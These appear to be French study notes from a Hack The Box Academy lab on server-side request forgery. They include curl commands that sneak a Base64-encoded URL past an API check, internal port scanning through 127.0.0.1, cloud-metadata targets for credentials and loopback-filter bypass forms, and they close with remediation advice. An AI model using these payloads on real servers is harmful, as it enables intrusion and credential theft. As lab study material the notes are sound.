---
titre: "Server-Side Request Forgery (SSRF)"
aliases:
  - "Server-Side Request Forgery (SSRF)"
plateforme: "Hack The Box Academy"
module: "Web Service & API Attacks"
date: 2026-07-02
tags: [HTB, API, SSRF, XSPA, Base64, Notes]
---

# 🧩 Server-Side Request Forgery (SSRF)

Lié : [[06 - WordPress xmlrpc]] · [[16 - Arsenal Scripts SQLi]] · [[18 - Cheatsheet Payloads]]

---

## Principe

On force **le serveur** à émettre une requête vers une destination qu'on choisit. Bascule mentale : ce n'est plus *toi* qui te connectes, c'est le *serveur* — qui a accès à des choses que toi non (services internes, métadonnées cloud, LAN). OWASP Top 10.

Impacts : interagir avec des systèmes internes, **scan de ports interne**, lecture de données locales, LFI, fuite de hashes NetNTLM (UNC Windows), parfois RCE.

---

## Cas du module (port 3000, `/api/userinfo`)

```bash
# 1) paramètre attendu
curl http://<TARGET>:3000/api/userinfo
# {"error":"'id' parameter is not given."}

# 2) listener
nc -nlvp 4444

# 3) URL en clair → REJETÉE
curl "http://<TARGET>:3000/api/userinfo?id=http://TON_IP:4444"
# {"error":"'id' parameter is invalid."}   ← pas protégé, juste mauvais format !

# 4) la clé : BASE64
echo "http://TON_IP:4444" | tr -d '\n' | base64
curl "http://<TARGET>:3000/api/userinfo?id=<BLOB_BASE64>"
```
→ le `nc` reçoit une connexion depuis l'IP cible (`User-Agent: axios/0.24.0`). **SSRF confirmée.**

> 🔑 `tr -d '\n'` retire le saut de ligne d'`echo` (sinon le `\n` est encodé et l'URL corrompue).
> 🔑 **Leçon** : un paramètre qui refuse ton input n'est pas forcément protégé — teste clair / Base64 / URL-encoding / double.

---

## Scan de ports interne via SSRF

On pointe la SSRF vers le serveur **lui-même** (`127.0.0.1`) sur le port à tester. On ne regarde plus le `nc` (la connexion reste interne) mais la **réponse de l'API** :

```bash
echo "http://127.0.0.1:3002" | tr -d '\n' | base64   # port testé
curl -m 8 "http://<TARGET>:3000/api/userinfo?id=<BLOB_3002>"

echo "http://127.0.0.1:9999" | tr -d '\n' | base64   # port fermé (référence)
curl -m 8 "http://<TARGET>:3000/api/userinfo?id=<BLOB_9999>"
```

**Interprétation (observé en vrai) :**
| Port | Comportement | Verdict |
|---|---|---|
| 9999 (fermé) | `{"error":"Cannot reach to the resource"}` immédiat | connexion refusée |
| 3002 (ouvert) | **hang** (la connexion s'établit, l'API attend une réponse) | port **ouvert** |

→ La **différence de comportement/timing** prouve l'état du port. C'est le principe du **XSPA** (cf. [[06 - WordPress xmlrpc]]). Réponse HTB : **Yes**.

> 💡 Ajoute `-m 5` à curl pour rendre le scan scriptable (ouvert = timeout, fermé = réponse rapide). Script de scan de plage : [[16 - Arsenal Scripts SQLi]].

---

## Pourquoi `127.0.0.1` est si puissant

`127.0.0.1` (loopback) = "la machine locale, évaluée **du point de vue du serveur**". Les services qui n'écoutent qu'en local (`127.0.0.1:3002`, MySQL `3306`, Redis `6379`) sont **invisibles de l'extérieur** mais joignables par le serveur. La SSRF te transforme en **proxy involontaire** vers l'interne.

Cibles classiques :
```
http://127.0.0.1:3306   MySQL
http://127.0.0.1:6379   Redis (souvent sans auth)
http://127.0.0.1:8080   panels admin internes
http://169.254.169.254/ métadonnées AWS/GCP → creds temporaires (cloud)
```

### Variantes de bypass (blacklist naïve de 127.0.0.1)
```
localhost      127.1      0.0.0.0      [::1]
2130706433 (décimal)      0x7f000001 (hexa)
```

---

## Remédiation

- Whitelist stricte des destinations autorisées (schéma, host, port).
- Bloquer les IP privées/loopback/link-local, résoudre puis re-vérifier (anti-DNS-rebinding).
- Désactiver les schémas inutiles (`file://`, `gopher://`).
